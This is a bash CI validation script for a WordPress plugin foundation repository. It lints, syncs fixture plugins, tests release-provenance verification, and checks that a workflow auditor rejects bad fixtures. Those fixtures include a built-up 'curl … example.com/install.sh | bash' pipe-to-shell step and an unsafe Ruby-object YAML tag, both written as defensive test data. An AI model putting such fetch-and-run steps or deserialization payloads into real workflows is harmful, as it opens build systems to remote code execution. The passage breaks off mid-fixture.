#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
# shellcheck source=../lib/require_tools.sh
. "$SCRIPT_DIR/../lib/require_tools.sh"

wp_plugin_base_require_commands "foundation validation" git php node ruby perl rsync zip unzip jq
audit_fixture=""
zip_fixture=""
forbidden_fixture=""
managed_security_child=""
authorization_fixture=""
deploy_protection_fixture=""
deploy_local_project_fixture=""
plugin_check_release_fixture=""
plugin_check_resolve_output=""
foundation_release_fixture=""
foundation_resolve_output=""
foundation_verify_fixture=""
foundation_verify_output=""
foundation_verify_verify_script=""
foundation_verify_release_json=""
foundation_verify_tag_ref_json=""
foundation_verify_compare_json=""
foundation_verify_pulls_json=""
foundation_verify_metadata_json=""
foundation_verify_sigstore_json=""
pr_stage_fixture=""
pr_stage_origin=""
pr_stage_output=""

while IFS= read -r file; do
  bash -n "$file"
done < <(find "$ROOT_DIR/scripts" -name '*.sh' -print | sort)

bash "$ROOT_DIR/scripts/ci/lint_shell.sh"
bash "$ROOT_DIR/scripts/ci/lint_workflows.sh"
bash "$ROOT_DIR/scripts/ci/lint_yaml.sh"
bash "$ROOT_DIR/scripts/ci/lint_markdown.sh"
bash "$ROOT_DIR/scripts/ci/lint_spelling.sh"
bash "$ROOT_DIR/scripts/ci/check_editorconfig.sh"
bash "$ROOT_DIR/scripts/ci/scan_secrets.sh"
bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh"
bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$ROOT_DIR"
bash "$ROOT_DIR/scripts/foundation/check_wordpress_env_tooling.sh"

for workflow_dir in \
  "$ROOT_DIR/.github/workflows" \
  "$ROOT_DIR/templates/child/.github/workflows"
do
  if find "$workflow_dir" -type f -name '*.yaml' | grep -q .; then
    echo "Workflow YAML files must use the .yml extension: $workflow_dir" >&2
    find "$workflow_dir" -type f -name '*.yaml' >&2
    exit 1
  fi
done

if grep -Fq 'pull/[0-9]+/merge' "$ROOT_DIR/scripts/release/verify_sigstore_bundle.sh"; then
  echo "Strict Sigstore verifier must not trust pull-request merge refs." >&2
  exit 1
fi

bash "$ROOT_DIR/scripts/foundation/check_version.sh"
bash "$ROOT_DIR/scripts/foundation/check_release_branch.sh" "release/$(tr -d '\n' < "$ROOT_DIR/VERSION")"

# Keep fixture validation hermetic even if the runner exports repository-level config vars.
unset FOUNDATION_REPOSITORY FOUNDATION_VERSION PLUGIN_NAME PLUGIN_SLUG MAIN_PLUGIN_FILE README_FILE ZIP_FILE
unset PHP_VERSION NODE_VERSION VERSION_CONSTANT_NAME WORDPRESS_ORG_SLUG CODEOWNERS_REVIEWERS PRODUCTION_ENVIRONMENT
unset PHP_RUNTIME_MATRIX PHP_RUNTIME_MATRIX_MODE WORDPRESS_READINESS_ENABLED WORDPRESS_QUALITY_PACK_ENABLED
unset WORDPRESS_SECURITY_PACK_ENABLED WOOCOMMERCE_QIT_ENABLED WP_ORG_DEPLOY_ENABLED
unset WP_PLUGIN_BASE_SECURITY_SUPPRESSIONS_FILE WP_PLUGIN_BASE_STRICT_DEPLOY_ENV_PROTECTION
unset WP_PLUGIN_BASE_PLUGIN_CHECK_CHECKS WP_PLUGIN_BASE_PLUGIN_CHECK_EXCLUDE_CHECKS
unset WP_PLUGIN_BASE_PLUGIN_CHECK_CATEGORIES WP_PLUGIN_BASE_PLUGIN_CHECK_IGNORE_CODES
unset WP_PLUGIN_BASE_PLUGIN_CHECK_STRICT_WARNINGS WP_PLUGIN_BASE_PLUGIN_CHECK_SEVERITY
unset WP_PLUGIN_BASE_PLUGIN_CHECK_ERROR_SEVERITY WP_PLUGIN_BASE_PLUGIN_CHECK_WARNING_SEVERITY

for fixture_name in standard-plugin nonstandard-plugin; do
  source_fixture="$ROOT_DIR/tests/fixtures/$fixture_name"
  fixture="$(mktemp -d)"
  branch_name="release/1.2.3"

  if [ "$fixture_name" = "nonstandard-plugin" ]; then
    branch_name="release/2.4.6"
  fi

  mkdir -p "$fixture/.wp-plugin-base"
  cp -R "$source_fixture/." "$fixture/"
  rsync -a --exclude '.git' "$ROOT_DIR/" "$fixture/.wp-plugin-base/"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "$branch_name"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/release/generate_github_release_body.sh" "${branch_name#release/}" > "$fixture/dist/release-body.md"
  rm -rf "$fixture/dist" "$fixture"
done

managed_child="$(mktemp -d)"
trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
mkdir -p "$managed_child/.wp-plugin-base"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$managed_child/"
rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_child/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$managed_child" bash "$managed_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
test -f "$managed_child/.github/workflows/ci.yml"
test -f "$managed_child/.github/workflows/prepare-release.yml"
test -f "$managed_child/.github/workflows/finalize-release.yml"
test -f "$managed_child/.github/workflows/release.yml"
test -f "$managed_child/.github/workflows/update-foundation.yml"
test -f "$managed_child/.github/dependabot.yml"
test -f "$managed_child/CONTRIBUTING.md"
test -f "$managed_child/.editorconfig"
test -f "$managed_child/.gitattributes"
test -f "$managed_child/.gitignore"
test -f "$managed_child/.wp-plugin-base-security-suppressions.json"
test -f "$managed_child/CHANGELOG.md"
test -f "$managed_child/SECURITY.md"
test -f "$managed_child/uninstall.php.example"
managed_paths_output="$(WP_PLUGIN_BASE_ROOT="$managed_child" bash "$ROOT_DIR/scripts/ci/list_managed_files.sh")"
grep -Fxq '.wp-plugin-base-security-suppressions.json' <<<"$managed_paths_output"
grep -Fq '/.wp-plugin-base-security-pack export-ignore' "$managed_child/.gitattributes"
grep -Fq '/.phpcs-security.xml.dist export-ignore' "$managed_child/.gitattributes"
grep -Fq 'secret-scan:' "$managed_child/.github/workflows/ci.yml"
test ! -f "$managed_child/.github/CODEOWNERS"
if find "$managed_child/.github/workflows" -type f -name '*.yaml' | grep -q .; then
  echo "Managed child workflows must use .yml, not .yaml." >&2
  find "$managed_child/.github/workflows" -type f -name '*.yaml' >&2
  exit 1
fi

cat > "$managed_child/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "preserve_on_sync",
      "path": "includes/public-endpoints.php",
      "justification": "Fixture suppression to ensure sync preserves project-owned suppressions."
    }
  ]
}
EOF
WP_PLUGIN_BASE_ROOT="$managed_child" bash "$managed_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
grep -Fq 'preserve_on_sync' "$managed_child/.wp-plugin-base-security-suppressions.json"

managed_security_child="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/quality-ready/." "$managed_security_child/"
mkdir -p "$managed_security_child/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_security_child/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$managed_security_child" bash "$managed_security_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
test -f "$managed_security_child/.phpcs-security.xml.dist"
test -f "$managed_security_child/.phpcs.xml.dist"
test -f "$managed_security_child/.wp-plugin-base-security-pack/composer.json"
test -f "$managed_security_child/.wp-plugin-base-security-pack/composer.lock"
test -f "$managed_security_child/.github/workflows/woocommerce-qit.yml"
if grep -Fq 'qit_cli_constraint' "$managed_security_child/.github/workflows/woocommerce-qit.yml"; then
  echo "Managed WooCommerce QIT workflow unexpectedly exposes qit_cli_constraint input." >&2
  exit 1
fi
grep -Fq 'Run Semgrep security scan' "$managed_security_child/.github/workflows/ci.yml"
grep -Fq "if: \${{ always() && needs.validate.outputs.wordpress_security_pack_enabled == 'true' }}" "$managed_security_child/.github/workflows/ci.yml"
grep -Fq "WP_PLUGIN_BASE_SECURITY_PACK_SKIP_SEMGREP: 'true'" "$managed_security_child/.github/workflows/ci.yml"
grep -Fq 'php-runtime-smoke:' "$managed_security_child/.github/workflows/ci.yml"
managed_security_paths_output="$(WP_PLUGIN_BASE_ROOT="$managed_security_child" bash "$ROOT_DIR/scripts/ci/list_managed_files.sh")"
grep -Fxq '.phpcs.xml.dist' <<<"$managed_security_paths_output"
grep -Fxq '.phpcs-security.xml.dist' <<<"$managed_security_paths_output"
grep -Fxq '.github/workflows/woocommerce-qit.yml' <<<"$managed_security_paths_output"
grep -Fq '/plugin-check/cli.php' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
grep -Fq -- '--require="$plugin_check_cli_bootstrap"' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
grep -Fq 'resolve_latest_plugin_check_version.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
grep -Fq 'resolve_latest_foundation_version.sh' "$ROOT_DIR/.github/workflows/update-foundation.yml"
grep -Fq 'steps.latest.outputs.candidates' "$ROOT_DIR/.github/workflows/update-foundation.yml"
grep -Fq 'steps.verify.outputs.version' "$ROOT_DIR/.github/workflows/update-foundation.yml"
grep -Fq 'steps.latest.outputs.candidates' "$ROOT_DIR/templates/child/.github/workflows/update-foundation.yml"
grep -Fq 'steps.verify.outputs.version' "$ROOT_DIR/templates/child/.github/workflows/update-foundation.yml"
grep -Fq 'GIT_ADD_PATHS: scripts/lib/wordpress_tooling.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
grep -Fq 'publish_github_release.sh --repair' "$ROOT_DIR/.github/workflows/release-foundation.yml"
grep -Fxq "FOUNDATION_VERSION=$(tr -d '\n' < "$ROOT_DIR/VERSION")" "$ROOT_DIR/templates/child/.wp-plugin-base.env.example"
bash "$ROOT_DIR/scripts/foundation/run_release_security_smoke.sh" --mode local-lite

plugin_check_release_fixture="$(mktemp)"
cat > "$plugin_check_release_fixture" <<'EOF'
[
  {
    "tag_name": "1.9.0",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "1.9.1",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "1.10.0",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.10.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

foundation_release_fixture="$(mktemp)"
cat > "$foundation_release_fixture" <<'EOF'
[
  {
    "tag_name": "v1.2.2",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.3",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.4",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.2" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=true' "$foundation_resolve_output"
grep -Fxq 'version=v1.2.4' "$foundation_resolve_output"
grep -Fxq 'v1.2.4' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d')
grep -Fxq 'v1.2.2' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d' | grep -v '^$' || true) && {
  echo "Foundation candidate list unexpectedly included the current version." >&2
  exit 1
}

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.4" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=false' "$foundation_resolve_output"
grep -Fxq 'version=' "$foundation_resolve_output"
grep -Fxq 'candidates=' "$foundation_resolve_output"

foundation_verify_fixture="$(mktemp -d)"
foundation_verify_release_json="$foundation_verify_fixture/release.json"
foundation_verify_tag_ref_json="$foundation_verify_fixture/tag-ref.json"
foundation_verify_compare_json="$foundation_verify_fixture/compare.json"
foundation_verify_pulls_json="$foundation_verify_fixture/pulls.json"
foundation_verify_metadata_json="$foundation_verify_fixture/dist-foundation-release.json"
foundation_verify_sigstore_json="$foundation_verify_fixture/dist-foundation-release.json.sigstore.json"
foundation_verify_verify_script="$foundation_verify_fixture/verify-sigstore.sh"

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    },
    {
      "name": "dist-foundation-release.json.sigstore.json",
      "url": "https://api.github.com/assets/sigstore"
    }
  ]
}
EOF

cat > "$foundation_verify_tag_ref_json" <<'EOF'
{
  "object": {
    "type": "commit",
    "sha": "1111111111111111111111111111111111111111"
  }
}
EOF

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

cat > "$foundation_verify_sigstore_json" <<'EOF'
{}
EOF

cat > "$foundation_verify_verify_script" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
artifact_path="${2:-}"
bundle_path="${3:-}"
test -f "$artifact_path"
test -f "$bundle_path"
if [ "${WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL:-false}" = "true" ]; then
  echo "stub verifier failure" >&2
  exit 1
fi
EOF
chmod +x "$foundation_verify_verify_script"

foundation_verify_output="$(mktemp)"
GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" \
    "$foundation_verify_output"
grep -Fxq 'version=v1.2.3' "$foundation_verify_output"
grep -Fxq 'commit_sha=1111111111111111111111111111111111111111' "$foundation_verify_output"

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "2222222222222222222222222222222222222222"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with mismatched metadata." >&2
  exit 1
fi

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

if GH_TOKEN=dummy FOUNDATION_ALLOWED_RELEASE_AUTHORS='trusted-bot' \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a disallowed release author." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "ahead"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed for a commit outside main ancestry." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[]
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed without a matching release PR." >&2
  exit 1
fi

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

if GH_TOKEN=dummy WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL=true \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a failing Sigstore verifier." >&2
  exit 1
fi

audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an unpinned action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a disallowed action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

remote_script_scheme='https'
remote_script_separator='://'
remote_script_target='example.com/install.sh'
remote_script_prefix="      - run: curl -fsSL ${remote_script_scheme}${remote_script_separator}${remote_script_target} | "
remote_script_shell='bash'
cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${remote_script_prefix}${remote_script_shell}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a remote script pipe-to-shell payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for broad permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  escalate:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for job-level permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/release.yml" <<'EOF'
name: release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  pull-requests: read
  attestations: write
  id-token: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an ungated pull_request_target workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/finalize-release.yml" <<'EOF'
name: finalize-release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  attestations: write
  id-token: write
jobs:
  release:
    if: >
      always() || (
        github.event.pull_request.merged == true &&
        github.event.pull_request.base.ref == 'main' &&
        github.event.pull_request.head.repo.full_name == github.repository &&
        (startsWith(github.event.pull_request.head.ref, 'release/') || startsWith(github.event.pull_request.head.ref, 'hotfix/'))
      )
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a broadened pull_request_target condition." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged id-token permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  pull-requests: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged pull-request permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  attestations: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged attestation permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: !ruby/object:OpenStruct
  table:
    workflow_dispatch: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for unsafe YAML content." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"
composite_remote_script_scheme='https'
composite_remote_script_separator='://'
composite_remote_script_target='example.com/install.sh'
